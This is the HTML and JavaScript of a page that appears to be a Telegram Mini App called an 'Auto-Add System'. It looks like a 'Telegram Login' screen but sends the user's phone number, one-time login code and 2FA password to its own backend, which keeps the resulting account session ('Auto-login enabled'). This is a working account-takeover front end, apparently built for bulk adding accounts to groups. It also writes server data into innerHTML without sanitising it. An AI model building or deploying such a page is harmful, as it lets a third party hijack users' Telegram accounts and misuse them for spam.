<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Add Account - Auto-Add System</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }

        body {
            min-height: 100vh;
            background: #0a0a0f;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #fff;
        }

        .login-container {
            width: 100%;
            max-width: 400px;
        }

        .login-card {
            background: rgba(18, 18, 30, 0.9);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 32px 24px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
        }

        .step-title {
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 8px;
            text-align: center;
        }

        .step-description {
            color: rgba(255, 255, 255, 0.6);
            font-size: 0.9rem;
            margin-bottom: 24px;
            text-align: center;
            line-height: 1.5;
        }

        /* Detected Account Card */
        .detected-card {
            background: rgba(32, 178, 170, 0.1);
            border: 1px solid rgba(32, 178, 170, 0.3);
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 20px;
            text-align: center;
        }

        .detected-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 12px;
            font-size: 1.5rem;
            font-weight: 700;
            color: white;
        }

        .detected-name {
            font-size: 1.1rem;
            font-weight: 600;
            margin-bottom: 4px;
        }

        .detected-username {
            color: rgba(255, 255, 255, 0.5);
            font-size: 0.85rem;
            margin-bottom: 8px;
        }

        .detected-phone {
            color: #20b2aa;
            font-size: 1rem;
            font-weight: 500;
        }

        .detected-status {
            color: #ffaa00;
            font-size: 0.85rem;
            margin-top: 8px;
            padding: 6px 12px;
            background: rgba(255, 170, 0, 0.1);
            border-radius: 8px;
            display: inline-block;
        }

        /* Code Input */
        .code-container {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 24px 0;
        }

        .code-box {
            width: 54px;
            height: 64px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.15);
            border-radius: 14px;
            color: #fff;
            font-size: 1.8rem;
            font-weight: 700;
            text-align: center;
            line-height: 60px;
            transition: all 0.3s;
        }

        .code-box.filled {
            border-color: rgba(138, 43, 226, 0.6);
            background: rgba(138, 43, 226, 0.15);
            box-shadow: 0 0 20px rgba(138, 43, 226, 0.3);
        }

        .code-box.active {
            border-color: rgba(255, 20, 147, 0.7);
            box-shadow: 0 0 25px rgba(255, 20, 147, 0.4);
            animation: pulse 1.5s ease-in-out infinite;
        }

        @keyframes pulse {
            0%, 100% { border-color: rgba(255, 20, 147, 0.7); }
            50% { border-color: rgba(138, 43, 226, 0.9); }
        }

        .hidden-input {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }

        .code-hint {
            text-align: center;
            color: rgba(255, 255, 255, 0.4);
            font-size: 0.8rem;
            margin-top: -16px;
            margin-bottom: 16px;
        }

        /* Buttons */
        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 14px;
            font-size: 1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .btn-primary {
            background: linear-gradient(135deg, #8a2be2, #ff1493);
            color: white;
            box-shadow: 0 8px 30px rgba(138, 43, 226, 0.3);
        }

        .btn-primary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(138, 43, 226, 0.5);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-telegram {
            background: linear-gradient(135deg, #0088cc, #006699);
            color: white;
            box-shadow: 0 8px 30px rgba(0, 136, 204, 0.3);
        }

        .btn-telegram:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(0, 136, 204, 0.5);
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.08);
            color: rgba(255, 255, 255, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.15);
            margin-top: 10px;
        }

        /* Messages */
        .error-message {
            background: rgba(255, 68, 68, 0.15);
            color: #ff6b6b;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #ff4444;
        }

        .success-message {
            background: rgba(32, 178, 170, 0.15);
            color: #20b2aa;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #20b2aa;
        }

        .info-message {
            background: rgba(138, 43, 226, 0.15);
            color: #b388ff;
            padding: 12px 16px;
            border-radius: 12px;
            margin-bottom: 16px;
            font-size: 0.85rem;
            display: none;
            border-left: 3px solid #8a2be2;
        }

        .error-message.show, .success-message.show, .info-message.show {
            display: block;
        }

        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.6s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .success-icon {
            font-size: 4rem;
            text-align: center;
            margin: 20px 0;
        }

        .attempt-counter {
            text-align: center;
            color: #ffaa00;
            font-size: 0.8rem;
            margin-top: 8px;
        }

        .or-divider {
            display: flex;
            align-items: center;
            margin: 16px 0;
            color: rgba(255,255,255,0.4);
            font-size: 0.85rem;
        }

        .or-divider::before,
        .or-divider::after {
            content: '';
            flex: 1;
            height: 1px;
            background: rgba(255,255,255,0.1);
        }

        .or-divider span {
            padding: 0 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <!-- Page 1: Detect / Phone -->
            <div id="page1">
                <div class="step-title">🔐 Telegram Login</div>
                <div class="step-description" id="page1Description">
                    Detecting your Telegram account...
                </div>

                <div class="error-message" id="error1"></div>
                <div class="success-message" id="success1"></div>
                <div class="info-message" id="info1"></div>

                <!-- Detected Account Card -->
                <div class="detected-card" id="detectedCard" style="display: none;">
                    <div class="detected-avatar" id="detectedAvatar">?</div>
                    <div class="detected-name" id="detectedName">---</div>
                    <div class="detected-username" id="detectedUsername"></div>
                    <div class="detected-phone" id="detectedPhone" style="display: none;"></div>
                    <div class="detected-status" id="detectedStatus"></div>
                </div>

                <!-- Share Phone Button -->
                <button class="btn btn-telegram" id="sharePhoneBtn" onclick="requestPhoneNumber()" style="display: none;">
                    📱 Share My Telegram Phone Number
                </button>

                <div class="or-divider" id="orDivider" style="display: none;">
                    <span>or enter manually</span>
                </div>

                <!-- Manual Phone Input -->
                <div id="phoneInputGroup" style="display: none;">
                    <div style="position: relative; margin-bottom: 20px;">
                        <input type="tel" class="form-input" id="phone" 
                               placeholder="Phone number with country code" 
                               inputmode="numeric"
                               style="width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.05); 
                                      border: 1px solid rgba(255,255,255,0.15); border-radius: 14px; 
                                      color: #fff; font-size: 1rem; outline: none;">
                        <span style="position: absolute; left: 16px; top: 14px; color: #8a2be2; font-weight: 700;">+</span>
                    </div>
                </div>

                <button class="btn btn-primary" id="sendCodeBtn" onclick="sendCode()" style="display: none;">
                    <span>Send Verification Code</span>
                </button>

                <div id="loadingIndicator" style="text-align: center; padding: 20px; display: none;">
                    <span class="loading-spinner"></span>
                    <span style="margin-left: 8px; color: rgba(255,255,255,0.6);" id="loadingText">Detecting your account...</span>
                </div>
            </div>

            <!-- Page 2: Code Verification -->
            <div id="page2" style="display: none;">
                <div class="step-title">📱 Enter Code</div>
                <div class="step-description" id="codeDescription">
                    Enter the 5-digit code from Telegram
                </div>

                <div class="error-message" id="error2"></div>
                <div class="success-message" id="success2"></div>

                <input type="text" id="hiddenCodeInput" class="hidden-input" maxlength="5" inputmode="numeric" autocomplete="one-time-code">
                
                <div class="code-container" id="codeBoxes" onclick="focusCodeInput()">
                    <div class="code-box" id="box1"></div>
                    <div class="code-box" id="box2"></div>
                    <div class="code-box" id="box3"></div>
                    <div class="code-box" id="box4"></div>
                    <div class="code-box" id="box5"></div>
                </div>

                <div class="code-hint">Auto-verifies when complete</div>

                <div id="passwordGroup" style="display: none;">
                    <input type="password" class="form-input" id="password" 
                           placeholder="2FA Password"
                           style="width: 100%; padding: 14px 16px; background: rgba(255,255,255,0.05); 
                                  border: 1px solid rgba(255,255,255,0.15); border-radius: 14px; 
                                  color: #fff; font-size: 1rem; outline: none; margin-bottom: 16px;">
                </div>

                <button class="btn btn-primary" id="verifyBtn" onclick="verifyCode()">
                    <span>Verify & Add Account</span>
                </button>

                <button class="btn btn-secondary" onclick="backToPage1()">
                    ← Back
                </button>

                <div class="attempt-counter" id="attemptCounter"></div>
            </div>

            <!-- Page 3: Success -->
            <div id="page3" style="display: none;">
                <div class="success-icon">✅</div>
                <div class="step-title" style="color: #20b2aa;">Account Added!</div>
                <div class="step-description" id="successAccountInfo">
                    Your account has been connected.
                </div>
                
                <button class="btn btn-primary" onclick="goToAutoAdd()">
                    ⚙️ Auto-Add Settings
                </button>
                
                <button class="btn btn-secondary" onclick="addAnotherAccount()">
                    ➕ Add Another Account
                </button>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // STATE
        // ============================================
        let currentSessionId = null;
        let currentPhone = '';
        let autoDetected = false;
        let telegramUser = null;
        let codeAttempts = 0;
        let isAutoVerifying = false;
        let savedPhoneForUser = null;

        // DOM elements
        const hiddenInput = document.getElementById('hiddenCodeInput');
        const boxes = [
            document.getElementById('box1'),
            document.getElementById('box2'),
            document.getElementById('box3'),
            document.getElementById('box4'),
            document.getElementById('box5')
        ];

        // ============================================
        // TELEGRAM MINI APP DETECTION
        // ============================================
        
        function getTelegramWebApp() {
            if (window.Telegram && window.Telegram.WebApp) {
                const tg = window.Telegram.WebApp;
                try {
                    tg.ready();
                    tg.expand();
                } catch(e) {}
                return tg;
            }
            return null;
        }

        function getTelegramInitData() {
            const tg = getTelegramWebApp();
            
            if (tg) {
                const initData = tg.initData || '';
                const initDataUnsafe = tg.initDataUnsafe || {};
                
                console.log('✅ Telegram WebApp detected');
                console.log('Version:', tg.version);
                console.log('InitData available:', !!initData);
                console.log('User data:', initDataUnsafe.user);
                
                if (initData) {
                    return {
                        initData: initData,
                        user: initDataUnsafe.user || null,
                        isTelegramApp: true
                    };
                }
            }
            
            // Method 2: URL query string
            const queryString = window.location.search.substring(1);
            if (queryString && (queryString.includes('hash=') || queryString.includes('user='))) {
                console.log('✅ Telegram data found in URL query');
                
                let user = null;
                const urlParams = new URLSearchParams(queryString);
                const userParam = urlParams.get('user');
                if (userParam) {
                    try {
                        user = JSON.parse(decodeURIComponent(userParam));
                    } catch(e) {}
                }
                
                return {
                    initData: queryString,
                    user: user,
                    isTelegramApp: true
                };
            }
            
            // Method 3: Full URL for standalone
            const fullUrl = window.location.href;
            if (fullUrl.includes('tgWebAppData=')) {
                console.log('✅ Telegram data found in tgWebAppData');
                const match = fullUrl.match(/tgWebAppData=([^&]+)/);
                if (match) {
                    try {
                        const decoded = decodeURIComponent(match[1]);
                        const userMatch = decoded.match(/"user"\s*:\s*({[^}]+})/);
                        let user = null;
                        if (userMatch) {
                            try {
                                user = JSON.parse(userMatch[1]);
                            } catch(e) {}
                        }
                        return {
                            initData: decoded,
                            user: user,
                            isTelegramApp: true
                        };
                    } catch(e) {}
                }
            }
            
            console.log('❌ No Telegram init data found');
            return { initData: null, user: null, isTelegramApp: false };
        }

        // ============================================
        // REQUEST PHONE NUMBER FROM TELEGRAM
        // ============================================
        
        async function requestPhoneNumber() {
            const tg = getTelegramWebApp();
            
            if (!tg) {
                showError('Please open this app from Telegram', 1);
                return;
            }
            
            // Check if Telegram version supports requesting phone
            if (parseFloat(tg.version) < 6.9) {
                console.log('Telegram version too old for phone request, showing manual input');
                showManualPhoneInput();
                return;
            }
            
            try {
                // Request phone number from Telegram
                // This will show Telegram's native phone sharing dialog
                const button = document.getElementById('sharePhoneBtn');
                setLoading(button, true);
                
                console.log('Requesting phone number from Telegram...');
                
                // Method 1: Using Telegram WebApp API
                if (tg.requestContact) {
                    tg.requestContact((success, response) => {
                        if (success && response) {
                            console.log('Phone received:', response);
                            handlePhoneReceived(response.phone_number || response.phone);
                        } else {
                            console.log('User declined to share phone');
                            showManualPhoneInput();
                        }
                        setLoading(button, false);
                    });
                } 
                // Method 2: Using requestPhoneAccess (newer API)
                else if (tg.requestPhoneAccess) {
                    tg.requestPhoneAccess()
                        .then(response => {
                            console.log('Phone access granted:', response);
                            handlePhoneReceived(response.phone_number || response.phone);
                        })
                        .catch(err => {
                            console.log('Phone access denied:', err);
                            showManualPhoneInput();
                        })
                        .finally(() => {
                            setLoading(button, false);
                        });
                }
                // Method 3: Fallback - try to get phone from user object
                else {
                    const user = tg.initDataUnsafe?.user;
                    if (user && user.phone_number) {
                        handlePhoneReceived(user.phone_number);
                    } else {
                        console.log('Phone not available in user object');
                        showManualPhoneInput();
                    }
                    setLoading(button, false);
                }
                
            } catch (error) {
                console.error('Error requesting phone:', error);
                setLoading(button, false);
                showManualPhoneInput();
            }
        }
        
        function handlePhoneReceived(phone) {
            if (!phone) {
                showManualPhoneInput();
                return;
            }
            
            // Clean phone number
            phone = phone.replace(/[^0-9+]/g, '');
            if (!phone.startsWith('+')) phone = '+' + phone;
            
            currentPhone = phone;
            
            // Update UI
            document.getElementById('detectedPhone').style.display = 'block';
            document.getElementById('detectedPhone').textContent = `📱 ${phone}`;
            document.getElementById('detectedStatus').textContent = '✅ Phone received!';
            document.getElementById('detectedStatus').style.color = '#20b2aa';
            document.getElementById('detectedStatus').style.background = 'rgba(32, 178, 170, 0.1)';
            
            document.getElementById('sharePhoneBtn').style.display = 'none';
            document.getElementById('phoneInputGroup').style.display = 'none';
            document.getElementById('orDivider').style.display = 'none';
            
            // Auto-send code
            showSuccess('📱 Phone received! Sending code...', 1);
            setTimeout(() => sendCodeWithPhone(phone), 500);
        }
        
        function showManualPhoneInput() {
            document.getElementById('sharePhoneBtn').style.display = 'none';
            document.getElementById('phoneInputGroup').style.display = 'block';
            document.getElementById('orDivider').style.display = 'none';
            document.getElementById('sendCodeBtn').style.display = 'block';
            
            document.getElementById('page1Description').textContent = 
                'Enter your phone number to receive verification code';
            
            const phoneInput = document.getElementById('phone');
            phoneInput.style.paddingLeft = '36px';
            setTimeout(() => phoneInput.focus(), 300);
            
            showInfo('Enter your phone with country code (e.g., +1234567890)', 1);
        }

        // ============================================
        // AUTO LOGIN FLOW
        // ============================================
        
        async function autoLogin() {
            const { initData, user, isTelegramApp } = getTelegramInitData();
            
            if (user) {
                telegramUser = user;
                showDetectedUser(user);
            }
            
            // NOT in Telegram - show manual input
            if (!isTelegramApp || !initData) {
                showLoading('Not in Telegram app...');
                setTimeout(() => {
                    hideLoading();
                    showManualPhoneInput();
                    document.getElementById('detectedCard').style.display = 'none';
                }, 500);
                return;
            }
            
            // In Telegram - try auto-login API first
            showLoading('Detecting your account...');
            
            try {
                const response = await fetch('/api/telegram-auto-login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        initData: initData,
                        user: user
                    })
                });

                const data = await response.json();
                hideLoading();
                
                console.log('Auto-login response:', data);

                if (data.success) {
                    // ✅ Phone FOUND - code was sent automatically
                    autoDetected = true;
                    currentSessionId = data.session_id;
                    
                    document.getElementById('detectedPhone').style.display = 'block';
                    document.getElementById('detectedPhone').textContent = `📱 ${data.phone_masked}`;
                    document.getElementById('detectedStatus').textContent = '✅ Account found!';
                    document.getElementById('detectedStatus').style.color = '#20b2aa';
                    document.getElementById('detectedStatus').style.background = 'rgba(32, 178, 170, 0.1)';
                    
                    document.getElementById('sharePhoneBtn').style.display = 'none';
                    document.getElementById('phoneInputGroup').style.display = 'none';
                    document.getElementById('sendCodeBtn').style.display = 'none';
                    document.getElementById('orDivider').style.display = 'none';
                    
                    showSuccess('✅ Code sent automatically!', 1);
                    
                    setTimeout(() => {
                        showCodePage(data.phone_masked, data.user_name);
                    }, 800);
                    
                } else if (data.needs_phone) {
                    // ❌ Phone NOT FOUND - show Telegram share button
                    document.getElementById('detectedPhone').style.display = 'none';
                    document.getElementById('detectedStatus').textContent = '🆕 Phone needed';
                    document.getElementById('detectedStatus').style.color = '#ffaa00';
                    document.getElementById('detectedStatus').style.background = 'rgba(255, 170, 0, 0.1)';
                    
                    document.getElementById('page1Description').textContent = 
                        'Share your phone number to receive verification code';
                    
                    // Show Telegram share button AND manual fallback
                    document.getElementById('sharePhoneBtn').style.display = 'block';
                    document.getElementById('orDivider').style.display = 'flex';
                    document.getElementById('phoneInputGroup').style.display = 'block';
                    document.getElementById('sendCodeBtn').style.display = 'block';
                    
                    showInfo('📱 Tap the blue button to share your phone automatically', 1);
                    
                } else {
                    // Other error
                    document.getElementById('sharePhoneBtn').style.display = 'block';
                    document.getElementById('orDivider').style.display = 'flex';
                    document.getElementById('phoneInputGroup').style.display = 'block';
                    document.getElementById('sendCodeBtn').style.display = 'block';
                    
                    showError(data.error || 'Could not auto-detect. Share your phone or enter manually.', 1);
                }
                
            } catch (error) {
                console.error('Auto-login error:', error);
                hideLoading();
                
                document.getElementById('sharePhoneBtn').style.display = 'block';
                document.getElementById('orDivider').style.display = 'flex';
                document.getElementById('phoneInputGroup').style.display = 'block';
                document.getElementById('sendCodeBtn').style.display = 'block';
                
                showError('Connection error. Please try again.', 1);
            }
        }

        // ============================================
        // UI HELPERS
        // ============================================

        function showLoading(text) {
            document.getElementById('loadingIndicator').style.display = 'flex';
            document.getElementById('loadingText').textContent = text;
            document.getElementById('sendCodeBtn').style.display = 'none';
            document.getElementById('sharePhoneBtn').style.display = 'none';
            document.getElementById('page1Description').textContent = text;
        }

        function hideLoading() {
            document.getElementById('loadingIndicator').style.display = 'none';
        }

        function showDetectedUser(user) {
            const card = document.getElementById('detectedCard');
            card.style.display = 'block';
            
            const initial = user.first_name ? user.first_name.charAt(0).toUpperCase() : '?';
            document.getElementById('detectedAvatar').textContent = initial;
            
            const fullName = [user.first_name, user.last_name].filter(Boolean).join(' ');
            document.getElementById('detectedName').textContent = fullName || 'Telegram User';
            
            document.getElementById('detectedUsername').textContent = 
                user.username ? `@${user.username}` : '';
            
            document.getElementById('detectedPhone').style.display = 'none';
        }

        function showCodePage(phoneMasked, userName) {
            document.getElementById('page1').style.display = 'none';
            document.getElementById('page2').style.display = 'block';
            
            let desc = 'Enter the 5-digit code from Telegram';
            if (phoneMasked) {
                desc = `Enter the 5-digit code sent to ${phoneMasked}`;
            }
            if (userName) {
                desc += `\nAccount: ${userName}`;
            }
            document.getElementById('codeDescription').textContent = desc;
            
            resetCodeInput();
            setTimeout(() => focusCodeInput(), 300);
        }

        function showError(message, pageNum = 1) {
            const el = document.getElementById(`error${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 5000);
            }
        }

        function hideError(pageNum = 1) {
            const el = document.getElementById(`error${pageNum}`);
            if (el) el.classList.remove('show');
        }

        function showSuccess(message, pageNum = 1) {
            const el = document.getElementById(`success${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 4000);
            }
        }

        function showInfo(message, pageNum = 1) {
            const el = document.getElementById(`info${pageNum}`);
            if (el) {
                el.textContent = message;
                el.classList.add('show');
                setTimeout(() => el.classList.remove('show'), 4000);
            }
        }

        function setLoading(button, isLoading) {
            button.disabled = isLoading;
            const originalText = button.getAttribute('data-original') || 'Share Phone';
            button.innerHTML = isLoading 
                ? '<span class="loading-spinner"></span><span>Requesting...</span>'
                : `<span>${originalText}</span>`;
        }

        // ============================================
        // CODE INPUT
        // ============================================
        
        function focusCodeInput() {
            hiddenInput.focus();
            updateActiveBox();
        }

        function resetCodeInput() {
            hiddenInput.value = '';
            updateCodeBoxes();
            codeAttempts = 0;
            isAutoVerifying = false;
            document.getElementById('attemptCounter').textContent = '';
            document.getElementById('password').value = '';
            document.getElementById('passwordGroup').style.display = 'none';
            hideError(2);
        }

        function updateActiveBox() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            boxes.forEach((box, i) => {
                box.classList.remove('active');
                if (i === code.length && code.length < 5) {
                    box.classList.add('active');
                }
            });
        }

        function updateCodeBoxes() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '').slice(0, 5);
            
            boxes.forEach((box, i) => {
                box.classList.remove('filled', 'active', 'error');
                if (i < code.length) {
                    box.textContent = code[i];
                    box.classList.add('filled');
                } else {
                    box.textContent = '';
                }
            });
            
            if (code.length < 5) {
                boxes[code.length].classList.add('active');
            }
            
            hideError(2);
            
            if (code.length === 5 && !isAutoVerifying) {
                isAutoVerifying = true;
                setTimeout(() => {
                    if (hiddenInput.value.replace(/[^0-9]/g, '').length === 5) {
                        autoVerify();
                    } else {
                        isAutoVerifying = false;
                    }
                }, 300);
            }
        }

        function autoVerify() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            if (code.length !== 5) {
                isAutoVerifying = false;
                return;
            }

            const needPassword = document.getElementById('passwordGroup').style.display === 'block';
            
            if (!needPassword) {
                setLoadingBtn(document.getElementById('verifyBtn'), true);
                hideError(2);
                performVerification(code, '');
            } else {
                const passwordInput = document.getElementById('password');
                if (!passwordInput.value) {
                    passwordInput.focus();
                    showError('2FA password required', 2);
                    isAutoVerifying = false;
                } else {
                    setLoadingBtn(document.getElementById('verifyBtn'), true);
                    hideError(2);
                    performVerification(code, passwordInput.value);
                }
            }
            
            isAutoVerifying = false;
        }

        function setLoadingBtn(button, isLoading) {
            button.disabled = isLoading;
            const originalText = button.getAttribute('data-original') || 'Submit';
            button.innerHTML = isLoading 
                ? '<span class="loading-spinner"></span><span>Processing...</span>'
                : `<span>${originalText}</span>`;
        }

        // ============================================
        // API CALLS
        // ============================================

        async function sendCodeWithPhone(phone) {
            if (!phone) {
                showError('No phone number available', 1);
                return;
            }
            
            try {
                const response = await fetch('/api/add-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phone,
                        telegramId: telegramUser?.id || ''
                    })
                });

                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.session_id;
                    currentPhone = phone;
                    showCodePage(phone, telegramUser?.first_name);
                } else {
                    showError(data.error || 'Failed to send code', 1);
                }
            } catch (error) {
                showError('Network error. Please try again.', 1);
            }
        }

        async function sendCode() {
            let phone = document.getElementById('phone').value.trim().replace(/\s+/g, '');
            
            if (!phone) {
                showError('Please enter your phone number', 1);
                document.getElementById('phone').focus();
                return;
            }

            phone = phone.replace(/[^0-9+]/g, '');
            if (!phone.startsWith('+')) phone = '+' + phone;

            setLoadingBtn(document.getElementById('sendCodeBtn'), true);
            hideError(1);

            try {
                const response = await fetch('/api/add-account', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        phone: phone,
                        telegramId: telegramUser?.id || ''
                    })
                });

                const data = await response.json();

                if (data.success) {
                    currentSessionId = data.session_id;
                    currentPhone = phone;
                    showCodePage(phone, telegramUser?.first_name);
                } else {
                    showError(data.error || 'Failed to send code', 1);
                }
            } catch (error) {
                showError('Network error. Please try again.', 1);
            } finally {
                setLoadingBtn(document.getElementById('sendCodeBtn'), false);
            }
        }

        async function performVerification(code, password) {
            try {
                const response = await fetch('/api/verify-code', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        code: code,
                        session_id: currentSessionId,
                        password: password
                    })
                });

                const data = await response.json();

                if (data.success) {
                    document.getElementById('page2').style.display = 'none';
                    document.getElementById('page3').style.display = 'block';
                    
                    const accountName = data.account?.name || 'User';
                    let info = `<strong>${accountName}</strong>`;
                    if (currentPhone) info += `<br>📱 ${currentPhone}`;
                    if (data.account_age) info += `<br>📅 Age: ${data.account_age}`;
                    if (data.auto_login_enabled) info += `<br>🔁 Auto-login enabled for future visits`;
                    document.getElementById('successAccountInfo').innerHTML = info;
                    
                } else if (data.need_password) {
                    document.getElementById('passwordGroup').style.display = 'block';
                    document.getElementById('password').value = '';
                    document.getElementById('password').focus();
                    showError('2FA enabled. Enter your password.', 2);
                    isAutoVerifying = false;
                    
                } else {
                    const errMsg = data.error || 'Verification failed';
                    codeAttempts++;
                    const remaining = 5 - codeAttempts;
                    
                    if (remaining > 0) {
                        showError(`${errMsg} (${remaining} attempts left)`, 2);
                    } else {
                        showError('Too many attempts. Please start over.', 2);
                        setTimeout(() => backToPage1(), 2000);
                    }
                    
                    document.getElementById('attemptCounter').textContent = 
                        remaining > 0 ? `${remaining} attempts remaining` : 'No attempts left';
                    
                    resetCodeInput();
                    focusCodeInput();
                    isAutoVerifying = false;
                }
            } catch (error) {
                showError('Network error. Please try again.', 2);
                isAutoVerifying = false;
            } finally {
                setLoadingBtn(document.getElementById('verifyBtn'), false);
            }
        }

        async function verifyCode() {
            const code = hiddenInput.value.replace(/[^0-9]/g, '');
            
            if (code.length !== 5) {
                showError('Enter the complete 5-digit code', 2);
                focusCodeInput();
                return;
            }

            const passwordInput = document.getElementById('password');
            const needPassword = document.getElementById('passwordGroup').style.display === 'block';

            if (needPassword && !passwordInput.value) {
                showError('Enter your 2FA password', 2);
                passwordInput.focus();
                return;
            }

            setLoadingBtn(document.getElementById('verifyBtn'), true);
            hideError(2);
            
            await performVerification(code, passwordInput.value);
        }

        // ============================================
        // NAVIGATION
        // ============================================

        function backToPage1() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('password').value = '';
            document.getElementById('passwordGroup').style.display = 'none';
            hideError(1);
            hideError(2);
            resetCodeInput();
        }

        function goToAutoAdd() {
            window.location.href = '/auto-add';
        }

        function addAnotherAccount() {
            document.getElementById('page1').style.display = 'block';
            document.getElementById('page2').style.display = 'none';
            document.getElementById('page3').style.display = 'none';
            document.getElementById('phoneInputGroup').style.display = 'none';
            document.getElementById('detectedCard').style.display = 'none';
            document.getElementById('sharePhoneBtn').style.display = 'none';
            document.getElementById('orDivider').style.display = 'none';
            document.getElementById('sendCodeBtn').style.display = 'none';
            document.getElementById('phone').value = '';
            resetCodeInput();
            hideError(1);
            hideError(2);
            hideError(3);
            
            autoLogin();
        }

        // ============================================
        // EVENT LISTENERS
        // ============================================

        document.querySelectorAll('.btn-primary, .btn-telegram').forEach(btn => {
            const span = btn.querySelector('span');
            if (span && !btn.hasAttribute('data-original')) {
                btn.setAttribute('data-original', span.textContent);
            }
        });

        document.getElementById('phone').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') sendCode();
        });

        document.getElementById('password').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') verifyCode();
        });

        hiddenInput.addEventListener('input', function(e) {
            let value = this.value.replace(/[^0-9]/g, '').slice(0, 5);
            this.value = value;
            updateCodeBoxes();
        });

        hiddenInput.addEventListener('paste', function(e) {
            e.preventDefault();
            const digits = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, '').slice(0, 5);
            this.value = digits;
            updateCodeBoxes();
        });

        hiddenInput.addEventListener('keydown', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                verifyCode();
            }
        });

        // ============================================
        // INIT
        // ============================================
        
        window.addEventListener('load', () => {
            console.log('🚀 Login page loaded');
            console.log('User Agent:', navigator.userAgent);
            console.log('URL:', window.location.href);
            
            // Check if Telegram SDK is available
            if (window.Telegram?.WebApp) {
                console.log('Telegram SDK version:', window.Telegram.WebApp.version);
                console.log('Platform:', window.Telegram.WebApp.platform);
            }
            
            setTimeout(() => {
                autoLogin();
            }, 500);
        });
    </script>
</body>
</html>
